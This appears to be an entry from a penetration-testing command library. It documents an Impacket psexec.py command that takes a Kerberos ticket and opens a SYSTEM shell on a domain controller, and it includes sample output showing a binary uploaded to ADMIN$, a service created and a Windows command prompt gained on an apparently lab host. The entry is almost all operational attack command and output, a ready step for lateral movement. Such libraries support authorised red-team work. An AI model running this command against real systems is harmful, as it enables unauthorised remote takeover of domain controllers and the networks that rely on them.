---
id: c9bd2dd9-f80c-4d21-a1d8-46b906230e69
name: psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket
type: command
executor: bash
data: psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
output: 'root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.bank.local
  -k -no-pass -dc-ip 10.10.10.5

  Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

  [*] Requesting shares on dc01.bank.local.....

  [*] Found writable share ADMIN$

  [*] Uploading file CTNWrpxH.exe

  [*] Opening SVCManager on dc01.bank.local.....

  [*] Creating service WiEc on dc01.bank.local.....

  [*] Starting service WiEc.....

  [!] Press help for extra shell commands

  Microsoft Windows [Version 10.0.14393]

  (c) 2016 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>'
created_at: '2020-06-24T05:08:26.192791+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# psexec.py Spawn a SYSTEM Shell with a Kerberos Ticket

```bash
psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
```

## Expected Output

```
root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.bank.local -k -no-pass -dc-ip 10.10.10.5
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc01.bank.local.....
[*] Found writable share ADMIN$
[*] Uploading file CTNWrpxH.exe
[*] Opening SVCManager on dc01.bank.local.....
[*] Creating service WiEc on dc01.bank.local.....
[*] Starting service WiEc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
